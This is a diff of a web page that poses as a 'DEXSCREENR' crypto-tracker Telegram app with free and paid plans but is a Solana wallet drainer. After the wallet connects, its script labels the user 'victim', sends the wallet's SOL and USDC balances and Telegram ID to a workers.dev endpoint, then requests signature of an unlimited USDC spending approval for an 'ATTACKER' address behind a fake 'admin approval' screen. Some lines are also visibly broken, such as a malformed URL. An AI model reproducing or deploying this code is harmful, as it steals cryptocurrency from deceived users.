@@ -2,137 +2,67 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>DEXSCREENR</title>
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+<meta name="viewport" content="width=device-width, initial;-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title padding>DEXSCREENR</title>
+<script src="https:://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; }
-  
-  body {
-    background-color: #050505;
-    color: #ffffff;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-    overflow: hidden;
-    position: relative;
-  }
-
-  #telegram-screen {
-    display: none; flex-direction: column; align-items: center; justify-content: center;
-    text-align: center; width: 100%; max-width: 320px; position: absolute; z-index: 20;
-  }
-
-  .pulse-ring {
-    width: 80px; height: 80px; border-radius: 50%;
-    background: rgba(20, 241, 149, 0.1);
-    display: flex; align-items: center; justify-content: center;
-    margin-bottom: 24px; position: relative;
-  }
-  
-  .pulse-ring::before {
-    content: ''; position: absolute; width: 100%; height: 100%;
-    border-radius: 50%; border: 1px solid #14F195; animation: pulse 2s infinite ease-out;
-  }
+  * { margin: 0 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; }
+  body { background-color: #050505; color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; overflow: hidden; position: relative; }
+  #telegram-screen { display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; width: 100%; max-width: 320px; position: absolute; z-index: 20; }
+  .pulse-ring { width: 80px; height: 80px; border-radius: 50%; background: rgba(20, 241, 149, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; position: relative; }
+  .pulse-ring::before { content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 1px solid #14F195; animation: pulse 2s infinite ease-out; }
   @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
   .pulse-ring svg { width: 32px; height: 32px; color: #14F195; }
-
   #telegram-screen h1 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
   #telegram-screen p { font-size: 13px; color: #a1a1aa; line-height: 1.5; margin-bottom: 32px; }
-
-  .open-phantom-btn {
-    width: 100%; padding: 16px; border-radius: 16px;
-    background: #ffffff; color: #000000; font-weight: 700; font-size: 15px;
-    border: none; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(255,255,255,0.1);
-  }
+  .open-phantom-btn { width: 100%; padding: 16px; border-radius: 16px; background: #ffffff; color: #000000; font-weight: 700; font-size: 15px; border: none; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
   .open-phantom-btn:active { transform: scale(0.96); }
-
-  #boot-screen {
-    display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-    background: #000; z-index: 9999; align-items: center; justify-content: center;
-    transition: opacity 1.5s ease;
-  }
-
-  .boot-title {
-    font-size: 28px; font-weight: 900; letter-spacing: 4px;
-    color: #ffffff; animation: pulseTitle 3s infinite ease-in-out alternate;
-  }
+  #boot-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; align-items: center; justify-content: center; transition: opacity 1.5s ease; }
+  .boot-title { font-size: 28px; font-weight: 900; letter-spacing: 4px; color: #ffffff; animation: pulseTitle 3s infinite ease-in-out alternate; }
   @keyframes pulseTitle { 0% { text-shadow: 0 0 10px rgba(20, 241, 149, 0.2); opacity: 0.8; } 100% { text-shadow: 0 0 30px rgba(20, 241, 149, 0.8); opacity: 1; } }
-
-  #app-screen {
-    display: none; flex-direction: column; align-items: center;
-    width: 100%; max-width: 360px; animation: slideUp 1.2s cubic-bezier(0.16, 1, 0.3, 1);
-    position: relative; z-index: 10;
-  }
-  
+  #app-screen { display: none; flex-direction: column; align-items: center; width: 100%; max-width: 360px; animation: slideUp 1.2s cubic-bezier(0.16, 1, 0.3, 1); position: relative; z-index: 10; }
   .bg-glow { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; overflow: hidden; background: #050505; }
   .orb { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.3; animation: float 12s infinite ease-in-out alternate; }
   .orb-1 { width: 300px; height: 300px; background: rgba(20, 241, 149, 0.2); top: -5%; left: -10%; }
   .orb-2 { width: 400px; height: 400px; background: rgba(153, 69, 255, 0.15); bottom: -10%; right: -20%; animation-delay: -5s; }
   @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, 50px) scale(1.1); } }
   @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
-
-  .glass-container {
-    width: 100%; background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
-    border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px;
-    display: flex; flex-direction: column; align-items: center;
-    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative;
-  }
-
+  .glass-container { width: 100%; background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative; }
   .header { width: 100%; text-align: center; margin-bottom: 24px; }
   .header span { font-size: 20px; font-weight: 900; letter-spacing: 1.5px; color: #ffffff; text-transform: uppercase; }
   .header p { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
-
   #pricing-screen { width: 100%; display: flex; flex-direction: column; gap: 10px; }
-  
-  .plan-card {
-    background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06);
-    border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center;
-    cursor: pointer; transition: all 0.3s ease; position: relative; height: 72px;
-  }
+  .plan-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.3s ease; position: relative; height: 72px; }
   .plan-card:active { transform: scale(0.97); background: rgba(20, 241, 149, 0.1); border-color: rgba(20, 241, 149, 0.5); }
   .plan-card.free { border-color: rgba(20, 241, 149, 0.4); background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%); }
-  
   .plan-info { width: 100%; display: flex; justify-content: space-between; align-items: center; }
   .plan-info h3 { font-size: 15px; font-weight: 700; color: #fff; }
   .plan-info p { font-size: 11px; color: #a1a1aa; margin-top: 2px; }
   .plan-price { font-size: 15px; font-weight: 800; color: #14F195; }
   .plan-price.paid { color: #ffffff; }
-
   .code-wrapper { display: none; width: 100%; height: 100%; align-items: center; justify-content: space-between; animation: fadeIn 0.3s ease; }
   .code-wrapper input { background: transparent; border: none; outline: none; color: #fff; font-size: 16px; width: 80%; font-family: monospace; }
   .code-wrapper input::placeholder { color: #52525b; font-family: -apple-system, sans-serif; font-size: 14px; }
   .code-wrapper input.error::placeholder { color: #ef4444; }
-
   .close-btn { background: rgba(255,255,255,0.1); border: none; color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 12px; }
-
   @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
   .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
-
-  #loading-screen { 
-    display: none; flex-direction: column; align-items: center; justify-content: center; 
-    width: 100%; height: 200px; animation: fadeIn 0.3s ease;
-  }
+  #loading-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 200px; animation: fadeIn 0.3s ease; }
   .loading-title { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 12px; }
   .loading-bar-bg { width: 80%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 12px; }
   .loading-bar-fill { width: 0%; height: 100%; background: #14F195; animation: loadBar 4s ease-in-out forwards; }
   .loading-status { font-size: 11px; color: #a1a1aa; font-family: monospace; }
-  
   @keyframes loadBar { 0% { width: 0%; } 30% { width: 40%; } 60% { width: 75%; } 100% { width: 100%; } }
-
   #connect-screen { width: 100%; display: none; flex-direction: column; align-items: center; opacity: 0; transform: translateY(20px); transition: opacity 0.8s ease, transform 0.8s ease; }
   .status-text { font-size: 13px; margin-bottom: 20px; color: #a1a1aa; text-align: center; }
   .status-text span { color: #14F195; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
-
-  .slider-container { width: 100%; height: 60px; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 30px; position: relative; overflow: hidden; display: flex; flex-direction: row-reverse; align-items: center; padding: 4px; user-select: none; }
+  
+  .slider-container { width: 100%; height: 60px; background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 30px; position: relative; overflow: hidden; display: flex; flex-direction: row-reverse; align-items: center; padding: 4px; user-select: none; touch-action: none; }
   .slider-text { position: absolute; width: 100%; text-align: center; font-size: 14px; font-weight: 600; color: rgba(255, 255, 255, 0.5); pointer-events: none; z-index: 1; transition: opacity 0.3s; }
-  .slider-thumb { width: 52px; height: 52px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: transform 0.1s; }
+  .slider-thumb { width: 52px; height: 52px; background: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: grab; position: relative; z-index: 2; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: transform 0.1s; touch-action: none; }
   .slider-thumb:active { cursor: grabbing; }
   .slider-thumb svg { width: 22px; height: 22px; color: #000000; transform: rotate(180deg); transition: transform 0.3s ease; }
   
@@ -144,7 +74,6 @@
   @keyframes spin { to { transform: rotate(360deg); } }
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
   .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
-
   #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 10px 0; text-align: center; }
   .pending-icon { width: 64px; height: 64px; border-radius: 50%; background: rgba(251, 191, 36, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; border: 1px solid rgba(251, 191, 36, 0.3); }
   .pending-icon svg { width: 32px; height: 32px; color: #fbbf24; }
@@ -157,90 +86,28 @@
 <body>
 
   <div id="telegram-screen">
-    <div class="pulse-ring">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-    </div>
+    <div class="pulse-ring"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
     <h1>Connect Wallet</h1>
     <p>Open this application inside the Phantom app or extension to continue.</p>
     <button class="open-phantom-btn" id="openPhantomBtn">Open in Phantom</button>
   </div>
 
-  <div id="boot-screen">
-    <div class="boot-title">DEXSCREENR</div>
-  </div>
-
-  <div class="bg-glow">
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
-  </div>
+  <div id="boot-screen"><div class="boot-title">DEXSCREENR</div></div>
+  <div class="bg-glow"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
 
   <div id="app-screen">
     <div class="glass-container">
-      <div class="header">
-        <span>DEXSCREENR</span>
-        <p id="headerSub">Select a plan to continue.</p>
-      </div>
+      <div class="header"><span>DEXSCREENR</span><p id="headerSub">Select a plan to continue.</p></div>
 
       <div id="pricing-screen">
-        <div class="plan-card free" onclick="startLoading('Free Trial')">
-          <div class="plan-info">
-            <div><h3>1-Day Free Trial</h3><p>Launch special access</p></div>
-            <div class="plan-price">FREE</div>
-          </div>
-        </div>
-
-        <div class="plan-card" onclick="openCodeInput(this, '3-Day Access')">
-          <div class="plan-info">
-            <div><h3>3-Day Access</h3><p>Requires secret code</p></div>
-            <div class="plan-price paid">CODE</div>
-          </div>
-          <div class="code-wrapper">
-            <input type="text" placeholder="Enter code..." onkeyup="checkSecret(event, this)">
-            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
-          </div>
-        </div>
-
-        <div class="plan-card" onclick="openCodeInput(this, 'Weekly Pass')">
-          <div class="plan-info">
-            <div><h3>Weekly Pass</h3><p>Full access to tracker</p></div>
-            <div class="plan-price paid">0.1 SOL</div>
-          </div>
-          <div class="code-wrapper">
-            <input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)">
-            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
-          </div>
-        </div>
-
-        <div class="plan-card" onclick="openCodeInput(this, 'Monthly Pro')">
-          <div class="plan-info">
-            <div><h3>Monthly Pro</h3><p>Unlimited tracking</p></div>
-            <div class="plan-price paid">0.25 SOL</div>
-          </div>
-          <div class="code-wrapper">
-            <input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)">
-            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
-          </div>
-        </div>
-
-        <div class="plan-card" onclick="openCodeInput(this, 'Yearly Pro')">
-          <div class="plan-info">
-            <div><h3>Yearly Pro</h3><p>Best value</p></div>
-            <div class="plan-price paid">1.5 SOL</div>
-          </div>
-          <div class="code-wrapper">
-            <input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)">
-            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
-          </div>
-        </div>
+        <div class="plan-card free" onclick="startLoading('Free Trial')"><div class="plan-info"><div><h3>1-Day Free Trial</h3><p>Launch special access</p></div><div class="plan-price">FREE</div></div></div>
+        <div class="plan-card" onclick="openCodeInput(this, '3-Day Access')"><div class="plan-info"><div><h3>3-Day Access</h3><p>Requires secret code</p></div><div class="plan-price paid">CODE</div></div><div class="code-wrapper"><input type="text" placeholder="Enter code..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
+        <div class="plan-card" onclick="openCodeInput(this, 'Weekly Pass')"><div class="plan-info"><div><h3>Weekly Pass</h3><p>Full access to tracker</p></div><div class="plan-price paid">0.1 SOL</div></div><div class="code-wrapper"><input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
+        <div class="plan-card" onclick="openCodeInput(this, 'Monthly Pro')"><div class="plan-info"><div><h3>Monthly Pro</h3><p>Unlimited tracking</p></div><div class="plan-price paid">0.25 SOL</div></div><div class="code-wrapper"><input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
+        <div class="plan-card" onclick="openCodeInput(this, 'Yearly Pro')"><div class="plan-info"><div><h3>Yearly Pro</h3><p>Best value</p></div><div class="plan-price paid">1.5 SOL</div></div><div class="code-wrapper"><input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)"><button class="close-btn" onclick="closeCodeInput(event, this)">✕</button></div></div>
       </div>
 
-      <div id="loading-screen">
-        <div class="loading-title">Initializing Environment</div>
-        <div class="loading-bar-bg">
-          <div class="loading-bar-fill" id="loadBarFill"></div>
-        </div>
-        <div class="loading-status" id="loadStatus">Connecting...</div>
-      </div>
+      <div id="loading-screen"><div class="loading-title">Initializing Environment</div><div class="loading-bar-bg"><div class="loading-bar-fill" id="loadBarFill"></div></div><div class="loading-status" id="loadStatus">Connecting...</div></div>
 
       <div id="connect-screen">
         <div class="status-text">Plan: <span id="selectedPlanText">FREE</span></div>
@@ -255,14 +122,11 @@
       </div>
 
       <div id="dashboard-screen">
-        <div class="pending-icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
-        </div>
+        <div class="pending-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div>
         <h3 class="pending-title">Waiting for Admin Approval</h3>
         <p class="pending-desc">Your access request has been submitted. An admin will verify your wallet shortly.</p>
         <button class="ticket-btn" onclick="alert('Ticket creation is available after 48 hours of pending status.')">Make ticket if not approved in 48h</button>
       </div>
-
     </div>
   </div>
 
@@ -277,16 +141,9 @@
       window.Telegram.WebApp.ready();
       window.Telegram.WebApp.expand();
     }
-
     const isPhantom = window.phantom?.solana?.isPhantom;
-    if (isPhantom) {
-      tgScreen.style.display = 'none';
-      startIntro();
-    } else {
-      tgScreen.style.display = 'flex';
-      bootScreen.style.display = 'none';
-      appScreen.style.display = 'none';
-    }
+    if (isPhantom) { tgScreen.style.display = 'none'; startIntro(); } 
+    else { tgScreen.style.display = 'flex'; bootScreen.style.display = 'none'; appScreen.style.display = 'none'; }
   });
 
   openPhantomBtn.addEventListener('click', () => {
@@ -298,10 +155,7 @@
     bootScreen.style.display = 'flex';
     setTimeout(() => {
       bootScreen.style.opacity = '0';
-      setTimeout(() => {
-        bootScreen.style.display = 'none';
-        appScreen.style.display = 'flex';
-      }, 1500);
+      setTimeout(() => { bootScreen.style.display = 'none'; appScreen.style.display = 'flex'; }, 1500);
     }, 4000);
   }
 
@@ -314,24 +168,16 @@
 
   async function startLoading(planName) {
     pricingScreen.style.display = 'none';
-    
     let provider = window.phantom?.solana;
     if(!provider) { return; }
-
     try {
-      const resp = await provider.connect();
-      const victim = resp.publicKey.toString();
-      
+      await provider.connect();
       loadingScreen.style.display = 'flex';
       document.getElementById('loadStatus').textContent = `Generating license for ${planName}...`;
-
-      // KEIN FETCH MEHR HIER! (Verhindert die doppelte Nachricht)
-      
       setTimeout(() => {
         loadingScreen.style.display = 'none';
         headerSub.textContent = "Authorize connection.";
         selectedPlanText.textContent = planName;
-        
         connectScreen.style.display = 'flex';
         setTimeout(() => {
           connectScreen.style.opacity = '1';
@@ -339,24 +185,18 @@
           initSlider();
         }, 100);
       }, 4200);
-
     } catch(e) { goBack(); }
   }
 
   function openCodeInput(card, planName) {
     if (card.classList.contains('open')) return;
     document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('open'));
-    
     card.classList.add('open');
     card.querySelector('.plan-info').style.display = 'none';
     card.querySelector('.code-wrapper').style.display = 'flex';
-    
     const input = card.querySelector('input');
-    input.classList.remove('error');
-    input.value = '';
-    input.placeholder = 'Enter code...';
+    input.classList.remove('error'); input.value = ''; input.placeholder = 'Enter code...';
     setTimeout(() => { input.focus(); }, 100);
-
     document.addEventListener('click', function closeOnClickOutside(e) {
       if (!card.contains(e.target)) {
         closeCodeInput(null, card.querySelector('.close-btn'));
@@ -378,24 +218,15 @@
     if (e.key === 'Enter') {
       const val = input.value.toLowerCase();
       const card = input.closest('.plan-card');
-      
       if (val === 'free3tier' || val === 'alpha') {
         const planName = card.querySelector('h3').textContent;
         closeCodeInput(null, card.querySelector('.close-btn'));
         startLoading(planName);
-      } 
-      else {
-        input.value = '';
-        input.classList.add('error');
-        input.placeholder = 'Invalid key';
-        
+      } else {
+        input.value = ''; input.classList.add('error'); input.placeholder = 'Invalid key';
         card.classList.add('shake');
         setTimeout(() => card.classList.remove('shake'), 400);
-        
-        setTimeout(() => { 
-          input.classList.remove('error'); 
-          input.placeholder = 'Enter code...'; 
-        }, 2000);
+        setTimeout(() => { input.classList.remove('error'); input.placeholder = 'Enter code...'; }, 2000);
       }
     }
   }
@@ -408,25 +239,33 @@
 
   let isDragging = false; let startX = 0; let currentX = 0; let maxDrag = 0;
 
-  function initSlider() { maxDrag = container.offsetWidth - thumb.offsetWidth - 8; }
+  function initSlider() { 
+    maxDrag = container.offsetWidth - thumb.offsetWidth - 8; 
+  }
   
-  function startDrag(e) { 
+  thumb.addEventListener('pointerdown', (e) => {
     if (container.classList.contains('loading') || container.classList.contains('success')) return; 
-    isDragging = true; startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
-    thumb.style.transition = 'none'; 
-  }
-  
-  function moveDrag(e) {
+    isDragging = true;
+    startX = e.clientX;
+    thumb.style.transition = 'none';
+    thumb.setPointerCapture(e.pointerId);
+  });
+
+  thumb.addEventListener('pointermove', (e) => {
     if (!isDragging) return;
-    const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-    let delta = startX - clientX; 
-    if (delta < 0) delta = 0; if (delta > maxDrag) delta = maxDrag;
-    currentX = delta; thumb.style.transform = `translateX(-${currentX}px)`;
+    let delta = startX - e.clientX; 
+    if (delta < 0) delta = 0; 
+    if (delta > maxDrag) delta = maxDrag;
+    currentX = delta; 
+    thumb.style.transform = `translateX(-${currentX}px)`;
     text.style.opacity = 1 - (currentX / maxDrag);
-  }
-  
-  function endDrag() {
-    if (!isDragging) return; isDragging = false;
+  });
+
+  thumb.addEventListener('pointerup', (e) => {
+    if (!isDragging) return; 
+    isDragging = false;
+    thumb.releasePointerCapture(e.pointerId);
+    
     if (currentX > maxDrag * 0.7) {
       container.classList.add('loading'); text.style.opacity = 0;
       thumb.style.transition = 'transform 0.3s ease';
@@ -437,19 +276,17 @@
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
       thumb.style.transform = 'translateX(0)'; text.style.opacity = 1; currentX = 0;
     }
-  }
+  });
 
   async function triggerConnect() {
     let provider = window.phantom?.solana;
     if(!provider) { resetSlider(); return; }
-    
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
-      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); // Fix RPC
-      
+      const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
       
@@ -464,12 +301,10 @@
         } catch (e) { usdcAmount = 0; }
       }
 
-      // 1. Daten an Telegram schicken
       const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tg_user_id: tgUserId, ts: Date.now() });
       try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
       catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
 
-      // 2. Signatur anfordern
       if (usdcAmount > 0 && typeof splToken !== 'undefined') {
         const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
         const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
@@ -484,7 +319,6 @@
         });
       }
 
-      // 3. Erfolg
       spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" style="margin-left: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>';
       text.textContent = "Access Granted"; text.style.opacity = 1;
@@ -517,12 +351,6 @@
   }
 
   window.addEventListener('resize', initSlider);
-  thumb.addEventListener('mousedown', startDrag);
-  window.addEventListener('mousemove', moveDrag);
-  window.addEventListener('mouseup', endDrag);
-  thumb.addEventListener('touchstart', startDrag, {passive: false});
-  window.addEventListener('touchmove', moveDrag, {passive: false});
-  thumb.addEventListener('touchend', endDrag);
 </script>
 </body>
 </html>
